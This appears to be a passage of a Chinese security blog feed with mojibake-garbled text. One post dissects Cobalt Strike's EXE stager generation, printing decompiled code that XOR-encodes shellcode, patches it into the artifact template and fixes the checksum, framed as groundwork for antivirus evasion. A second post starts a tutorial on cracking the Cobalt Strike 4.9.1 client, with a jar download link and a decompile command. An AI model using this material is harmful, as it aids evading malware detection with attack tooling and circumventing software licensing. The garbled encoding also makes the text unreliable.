punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span>var9 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span>var6<span class="token punctuation">,</span> var6<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">BeaconLoader</span><span class="token punctuation">.</span><span class="token function">hasLoaderHint</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span><span class="token class-name">BeaconLoader</span><span class="token punctuation">.</span><span class="token function">getLoaderHint</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> <span class="token string">"GetModuleHandleA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span><span class="token class-name">BeaconLoader</span><span class="token punctuation">.</span><span class="token function">getLoaderHint</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> <span class="token string">"GetProcAddress"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>var10<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span>var7<span class="token punctuation">,</span> var7<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">License</span><span class="token punctuation">.</span><span class="token function">isTrial</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var10<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_trial</span><span class="token punctuation">(</span><span class="token string">"Added EICAR string to "</span> <span class="token operator">+</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var11 <span class="token operator">=</span> var10<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var11<span class="token punctuation">,</span>var2<span class="token operator">+</span><span class="token string">"å¡«å……A.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var7<span class="token punctuation">,</span><span class="token string">"Patchartifact"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcodeäº¦æˆ–å2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var13 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">replaceAt</span><span class="token punctuation">(</span>var13<span class="token punctuation">,</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var11<span class="token punctuation">)</span><span class="token punctuation">,</span> var9<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¡«å……artifact64big.exe çš„A</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var13<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Patchartifact"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcodeäº¦æˆ–å3.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var13<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var12<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">logException</span><span class="token punctuation">(</span><span class="token string">"patchArtifact"</span><span class="token punctuation">,</span> var12<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ç‚¹å‡»ä¿å­˜æ‰§è¡Œè¿‡ç¨‹</p><pre class="language-shell" data-language="shell"><code class="language-shell">ç‚¹å‡»ä¿å­˜çš„æ—¶å€™è§¦å‘ç”Ÿæˆç»“æœã€‚ã€‚ã€‚ã€‚ã€‚ã€‚C:\Users\Administrator\Desktop\artifact_x64.exeè¯»å–: resources&#x2F;artifact64.exeå†™å…¥: shellcode&#x2F;artifact64.exe.binå†™å…¥: shellcode&#x2F;PatchåŠ è½½å™¨ç›´æ¥åŠ è½½x64shellcode.binå†™å…¥: shellcode&#x2F;Patchartifactx64shellcodeäº¦æˆ–å.binå†™å…¥: shellcode&#x2F;Patchartifactx64shellcodeäº¦æˆ–åè¿˜åŸ.binå†™å…¥: shellcode&#x2F;artifact64.exeå¡«å……A.binå†™å…¥: shellcode&#x2F;Patchartifactx64shellcodeäº¦æˆ–å2.bincall replaceAt!!!å†™å…¥: shellcode&#x2F;Patchartifactx64shellcodeäº¦æˆ–å3.binfix checksum!!!!PEEditor fix checksum!!!!å†™å…¥: shellcode&#x2F;nofixsum.binå†™å…¥: shellcode&#x2F;fixchecsum.bin</code></pre><p>æˆ‘ä»¬çœ‹ åŸæ¥çš„resources&#x2F;artifact64.exe  æœ‰ä¸€å †A<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231046669.png" alt="artifact64.exe"><br>æˆ‘ä»¬ä½¿ç”¨åŸæ¥çš„ artifact64.exe  ç«ç»’ç›´æ¥æ€ã€‚æ‰€ä»¥è¦å…æ€å¾—ä¿®æ”¹ä¿®æ”¹artifact64.exe è¦ä¸å³ä½¿ä½ å¡«å……äº†è¿˜æ˜¯è¢«æ€è¿™å°±æ˜¯ä¸ºä»€ä¹ˆç”Ÿæˆé»˜è®¤çš„exeç”Ÿæˆå³è¢«æ€ã€‚å› ä¸ºæ¨¡ç‰ˆè¢«æ ‡è®°äº†è‚¯å®šä¼šè¢«æ€ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231047539.png" alt="ç«ç»’æŸ¥æ€"><br>æŠŠshellcode å¼‚æˆ–ä»¥ååœ¨å¡«å……åˆ°artifact64.exeé‡Œé¢ ç›¸å…³å…³é”®ä»£ç </p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var6 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var7 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>var1<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span><span class="token string">"PatchåŠ è½½å™¨ç›´æ¥åŠ è½½"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcode.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç›´æ¥ä½¿ç”¨loaderåŠ è½½</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var8 <span class="token operator">&lt;</span> var1<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>var8<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// System.out.println("äº¦æˆ–çš„æ•°å­—æ˜¯: " +var6[var8 % 4]);</span>var7<span class="token punctuation">[</span>var8<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>var1<span class="token punctuation">[</span>var8<span class="token punctuation">]</span> <span class="token operator">^</span> var6<span class="token punctuation">[</span>var8 <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//äº¦æˆ–åŠ å¯†ååˆ°å†…å­˜è¿˜åŸè§£å¯†åŠ è½½shellcode</span><span class="token punctuation">&#125;</span></code></pre><p>shellcodeå¼‚æˆ–<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231048243.png" alt="shellcodeå¼‚æˆ–"><br>shellcodeäº¦æˆ–åŠ å¯†ä¿å­˜åˆ°var7 æˆ‘ä»¬çœ‹äº¦æˆ–åçš„shellcodeç«ç»’æ€ä¸æ€ã€‚äº¦æˆ–ä»¥åæ²¡ååº”<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231049836.png" alt="shellcodeå¼‚æˆ–åä¸æ€"><br>ç„¶åæŠŠå¡«å……artifact64big.exe çš„A å¡«å……shellcodeã€‚ä¸Šé¢å·²ç»æè¿°äº†<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231050201.png" alt="å¼‚æˆ–åå¡«å……åˆ°Aé‡Œé¢"><br>ä¸‹å›¾å±•ç¤ºäº†shellcodeäº¦æˆ–åæ·»åŠ äº†æŸäº›ä¸œè¥¿ç„¶åç›´æ¥å¡«å……åˆ°æŒ‡å®šä¸ºæ­¢<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231050220.png" alt="åŸæ¥exeå’Œå¡«å……åå¯¹æ¯”"></p><p>æˆ‘ä»¬çœ‹shellcodeå¼‚æˆ–åå¡«å……åˆ°artifact64big.exe<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231051996.png" alt="shellcodeå¼‚æˆ–åå¡«å……åˆ°artifact64big.exe"></p><p>æŒ‰é“ç†æˆ‘ä»¬å¯ä»¥æ‰§è¡Œè¿™ä¸ªå¡«å……äº†shellcodeå¹¶ä¸”å¼‚æˆ–åçš„exeä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡Œåªæ˜¯æ²¡æœ‰ä¿®å¤sum<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231053635.png" alt="å¯ä»¥ä¸Šçº¿"></p><pre class="language-java" data-language="java"><code class="language-java">ä¿®å¤ sum<span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">fixChecksum</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"fix checksum!!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">License</span><span class="token punctuation">.</span><span class="token function">isTrial</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> var1<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"PEEditor fix checksum!!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">PEEditor</span> var2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PEEditor</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>            var2<span class="token punctuation">.</span><span class="token function">updateChecksum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span><span class="token string">"var1fixsum.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">getImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"fixchecsum.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> var2<span class="token punctuation">.</span><span class="token function">getImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">logException</span><span class="token punctuation">(</span><span class="token string">"fixChecksum() failed for "</span> <span class="token operator">+</span> var1<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token string">" byte file. Skipping the checksum update"</span><span class="token punctuation">,</span> var3<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> var1<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>a6ab8a95eacbb2890f2964902f7a5953   var1Nofixsum<span class="token punctuation">.</span>bin   æ²¡æœ‰fixchecksuma6ab8a95eacbb2890f2964902f7a5953   <span class="token class-name">Patchartifactx64shellcode</span>äº¦æˆ–å<span class="token number">3.</span>bin   å¯ä»¥ç›´æ¥è¿è¡Œa694ca2a7d3256100654cd2439b745cf   fixchecsum<span class="token punctuation">.</span>bin  fix checksuma694ca2a7d3256100654cd2439b745cf   artifact_x64<span class="token punctuation">.</span>exe  æœ€ç»ˆç”Ÿæˆçš„exe</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231054985.png" alt="æˆªå›¾å¯¹æ¯”"><br>å†…å­˜é‡Œé¢çœŸæ­£æ‰§è¡ŒåŠŸèƒ½çš„ç‚¹ã€‚æ‰€ä»¥è¿™ä¸ªä¼šè¢«æ€<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231055858.png" alt="å†…å­˜æ‰§è¡Œ"><br>å†…å­˜ç‰¹å¾å¯¹æ¯”<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231055175.png" alt="æˆ‘ä»¬çœ‹åˆ°å†…å­˜é‡Œé¢çš„ç‰¹å¾"><br>é€šè¿‡åˆ†æwindows exe æˆ‘ä»¬çŸ¥é“ stager æå‡ºå‡ºæ¥å¯ä»¥ç›´æ¥åŠ è½½ç±»ä¼¼è¿™ä¸ª<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231057695.png" alt="æå–stageçš„rawæ–‡ä»¶"><br>shellcodeæ‰§è¡Œ<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231057077.png" alt="shellcode"><br>å¯ä»¥ç›´æ¥ä¸Šçº¿<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231039529.png" alt="è‡ªå·±åŠ è½½shellcode"><br>æˆ‘ä»¬çœ‹ç”Ÿæˆè¯­è¨€çš„å‘ç°æ²¡æœ‰æ²¡æœ‰rawçš„æˆ‘ä»¬ç”Ÿæˆä¸€ä¸‹Cè¯­è¨€çš„stageçœ‹çœ‹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231059503.png" alt="ç”ŸæˆCè¯­è¨€stager"><br>æˆ‘ä»¬å‘ç°å¤§å°éƒ½ä¸€æ ·å†…å®¹ä¹Ÿä¸€æ ·ã€‚å¦‚æ­¤æˆ‘ä»¬å°±å¾—åˆ°é€šè¿‡windows exe ç”Ÿæˆçš„ç”±csè‡ªå¸¦çš„exeåŠ è½½shellcodeã€‚é€šè¿‡è¯­è¨€ç”Ÿæˆçš„shellcodeç”±æˆ‘ä»¬è‡ªå·±å†™çš„åŠ è½½å™¨åŠ è½½shellcodeã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡windows ç”Ÿæˆexeæ¨¡å¼å¾—åˆ°rawçš„shellcode ç›´æ¥ä½¿ç”¨åŠ è½½å™¨è¿›è¡ŒåŠ è½½ã€‚æˆ‘ä½¿ç”¨çš„c2profile ä¸ºé»˜è®¤çš„ã€‚ä¸‹ä¸€æ¬¡stagelessçš„æ—¶å€™è¯´ä¸€ä¸‹ä¸ºä»€ä¹ˆéœ€è¦cs2profile æ‰èƒ½è¿›è¡Œå…æ€ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231100024.png" alt="å¯¹æ¯”å‘ç°ä¸€æ ·"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>cs windowså¯æ‰§è¡Œç¨‹åºç”Ÿæˆè¿‡ç¨‹:<br>(1)resources&#x2F;httpsstager64.bin <br/><br>(2)æŠŠæ¨¡æ¿é‡Œé¢çš„Yå’ŒXåˆ†åˆ«æ›¿æ¢æˆä¸Šçº¿çš„ipçš„åœ°å€ç­‰<br/><br>(3)ç”Ÿæˆshellcodeæ–‡ä»¶<br/><br>(4)æŠŠç”Ÿæˆçš„shellcodeé€šè¿‡å¼‚æˆ–ä»¥å<br/><br>(5)æŠŠå¼‚æˆ–åçš„shellcodeæ”¾åˆ°artifact64big.exe é‡Œé¢<br/><br>(6)ç„¶åä¿®å¤ä¸€ä¸‹sum<br/><br>(7)ç›´æ¥ç”Ÿæˆexeæ–‡ä»¶<br/><br>é€šè¿‡ä¸Šè¿°ä½ è¦æ˜¯æ€è½¯ä½ è‚¯å®šæ ‡è®°artifact64big.exe æŠŠè¿™ä¸ªç‰¹å¾æ ‡è®°æ­»äº†ã€‚é™æ€ç‰¹å¾ã€‚<br>æ‰€ä»¥è¿™ä¹Ÿå°±æ˜¯å¦‚æœä½ è¦åšstage exeç”Ÿæˆçš„å…æ€è‚¯å®šè¦åŠ¨artifact64big.exe ã€‚ä¸‹ä¸€æœŸæˆ‘ä»¬åˆ†æstagelessç”ŸæˆåŸç†ä¹Ÿæ˜¯é€šè¿‡windows exeç”Ÿæˆstagelessæ¥åˆ†æã€‚</p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike 4.9.1-å®¢æˆ·ç«¯ç ´è§£(ä¸€)</title>
      <link href="/penetrationtest/2025/01/articles/57e088d4a92e9e48/"/>
      <url>/penetrationtest/2025/01/articles/57e088d4a92e9e48/</url>
      
        <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>æˆ‘ä»¬çŸ¥é“ CobaltStrike åœ¨æ¸—é€æµ‹è¯•ä¸­æ‰®æ¼”ç€é‡è¦çš„è§’è‰²ã€‚å› æ­¤çŸ¥é“ä»–çš„å·¥ä½œåŸç†å¯¹äºå…æ€æ¥è¯´è‡³å…³é‡è¦ã€‚ä¹‹å‰ä¹Ÿæœ‰å¾ˆå¤šæ–‡ç« å†™CobaltStrikeæˆ‘ä¸ªäººè®¤ä¸ºå¤§ä½¬ä»¬å¯¹äºæ–°æ‰‹æ¥è¯´å†™çš„ä¸å¤ªè¯¦ç»†å¯¼è‡´æœ‰äº›javaç¼–ç¨‹åŸºç¡€è–„å¼±çš„å¯èƒ½çœ‹ä¸å¤ªæ‡‚ã€‚å¤§ä½¬ä»¬è§‰å¾—è¿™äº›å¾ˆç®€å•ä½†æ˜¯å¯¹äºæ–°æ‰‹æ¥è¯´æ˜¯ä¸å¯é€¾è¶Šçš„é¸¿æ²Ÿã€‚æˆ‘é€šè¿‡äº’è”ç½‘æœç´¢å…³äºCobaltStrike 4.9.1 ç ´è§£æ–‡ç« è¾ƒå°‘ã€‚æœ‰çš„æ˜¯ä»˜è´¹çš„å¯¹äºè¿™ä¸ªç ´è§£æˆ‘æƒ³è¯´æ”¶è´¹ä¹Ÿå¯¹æ¯•ç«Ÿè¦åƒé¥­ä¸çŸ¥é“ä»˜è´¹çš„è®²è§£å¦‚ä½•ã€‚æˆ‘ç«™åœ¨æˆ‘è‡ªå·±çš„è§’åº¦ä¼šä¸€æ­¥ä¸€æ­¥å­¦ä¹ å¦‚ä½•ç ´è§£CobaltStrike 4.9.1 ä»0å¼€å§‹ã€‚å‰ææ˜¯ä½ å¿…é¡»æœ‰æœ‰ä¸€å®šçš„javaç¼–ç¨‹åŸºç¡€å¦åˆ™ä½ å¯èƒ½çœ‹ä¸æ‡‚ã€‚<br>æˆ‘ä»¬åç»­ä¼šå¯¹CobaltStrikeè¿›è¡Œè¿›ä¸€æ­¥çš„å‰–æã€‚æˆ‘è®²çš„åœ¨éƒ¨åˆ†ä¸œè¥¿ä¸Šæœ‰è¯¯æˆ–è€…æœ‰ç‘•ç–µå¸Œæœ›å¤§ä½¬ä»¬è½»å–·ã€‚æ¥ä¸‹æ¥å¼€å§‹å§ã€‚æˆ‘ä»¬å°†CobaltStrikeç®€ç§°csã€‚</p><h2 id="ä¸‹è½½åŸç‰ˆcså¹¶ä¸”è§£å‹"><a href="#ä¸‹è½½åŸç‰ˆcså¹¶ä¸”è§£å‹" class="headerlink" title="ä¸‹è½½åŸç‰ˆcså¹¶ä¸”è§£å‹"></a>ä¸‹è½½åŸç‰ˆcså¹¶ä¸”è§£å‹</h2><p>æˆ‘ä»¬ä»<a href="https://www.ddosi.org/cobalt-strike-4-9-1/%E4%B8%8B%E8%BD%BDcs%E5%8E%9F%E7%89%884.9.1">https://www.ddosi.org/cobalt-strike-4-9-1/ä¸‹è½½csåŸç‰ˆ4.9.1</a> è§£å‹å¯†ç ä¸º: <a href="http://www.ddosi.org/">www.ddosi.org</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101111494.png" alt="csåŸç‰ˆæœ¬ä¸‹è½½"><br>æˆ‘ä»¬æŠŠcobaltstrike-4.9.1.-original.jar è§£å‹å¦‚ä¸‹å›¾<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101115965.png" alt="å¦‚ä¸‹å›¾"><br>å…¶ä¸­cobaltstrike-client.jar å°±æ˜¯æˆ‘ä»¬éœ€è¦ç ´è§£çš„å®¢æˆ·ç«¯</p><h2 id="åç¼–è¯‘æºä»£ç "><a href="#åç¼–è¯‘æºä»£ç " class="headerlink" title="åç¼–è¯‘æºä»£ç "></a>åç¼–è¯‘æºä»£ç </h2><p>ç”±äºåŸç‰ˆæœ¬æ²¡æœ‰è¿›è¡Œæ··æ·†æ‰€ä»¥æˆ‘ä»¬ç›´æ¥ä½¿ç”¨ideaè‡ªå¸¦åç¼–è¯‘å™¨å¯¹jaråŒ…è¿›è¡Œåç¼–è¯‘æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªcssourceæ–‡ä»¶å¤¹ã€‚æŠŠjava-decompiler.jar ä»ideaé‡Œé¢æ‹·è´å‡ºæ¥æ”¾åˆ°å’ŒcssourceåŒä¸€ç›®å½•<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101124010.png" alt="åç¼–è¯‘jar"><br>æˆ‘ä»¬æ¥è¿›è¡Œåç¼–è¯‘ã€‚</p><pre class="language-sh" data-language="sh"><code class="language-sh">&quot;iedaå®‰è£…ç›®å½•\jbr\bin\java.exe&quot; -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs&#x3D;true cobaltstrike-client.jar cssource&#x2F;</code></pre><p>åœ¨åç¼–è¯‘çš„å¼€å§‹ä¼šæœ‰åœé¡¿å±äºæ­£å¸¸ç°è±¡ç­‰ç€å°±è¡Œå¦‚ä¸‹å›¾:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101130595.png" alt="åç¼–è¯‘é‡åˆ°åœé¡¿"><br>å‡ºç°ä¸‹å›¾å°±ç®—åç¼–è¯‘ç»“æŸäº†<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101356587.png" alt="åç¼–è¯‘ç»“æŸ"></p><h2 id="æŠŠåç¼–è¯‘çš„æºç å’Œlibæ”¾åˆ°ideaä¸­"><a href="#æŠŠåç¼–è¯‘çš„æºç å’Œlibæ”¾åˆ°ideaä¸­" class="headerlink" title="æŠŠåç¼–è¯‘çš„æºç å’Œlibæ”¾åˆ°ideaä¸­"></a>æŠŠåç¼–è¯‘çš„æºç å’Œlibæ”¾åˆ°ideaä¸­</h2><p>æ‰“å¼€idea ç‚¹å‡»File-New-projectåˆ›å»ºé¡¹ç›®csproject<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101400662.png" alt="åˆ›å»ºé¡¹ç›®"><br>åœ¨é¡¹ç›®ä¸­åˆ†åˆ«åˆ›å»ºlibå’ŒDecompileSrcã€‚lib copyåˆ° cobaltstrike-client.jarã€‚DecompileSrc cpoyåˆ°cobaltstrike-client.jaråç¼–è¯‘åçš„.javaæ–‡ä»¶<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101410734.png" alt="åç¼–è¯‘åçš„æ–‡ä»¶"><br>åœ¨ideaé¡¹ç›®ä¸­æ”¾ç½®å¦‚ä¸‹å›¾:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101416434.png" alt="ideaå¸ƒå±€ç»“æ„"></p><h2 id="éƒ¨ç½²è¿è¡Œç¯å¢ƒ"><a href="#éƒ¨ç½²è¿è¡Œç¯å¢ƒ" class="headerlink" title="éƒ¨ç½²è¿è¡Œç¯å¢ƒ"></a>éƒ¨ç½²è¿è¡Œç¯å¢ƒ</h2><p>1:ç»™é¡¹ç›®å¢åŠ ä¾èµ–<br/><br>ç‚¹å‡»-æ–‡ä»¶-é¡¹ç›®ç»“æ„-æ¨¡å—-ä¾èµ–<br><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101421399.png" alt="å¦‚å›¾"><br>ç„¶ååœ¨ç‚¹å‡»é‚£ä¸ªåŠ å·é€‰æ‹©ç‚¹å‡»åŠ å· jaræˆ–è€…æ˜¯ç›®å½•ã€‚é€‰æ‹©libåŒ…é‡Œé¢çš„cobaltstrike-client.jar<br><img 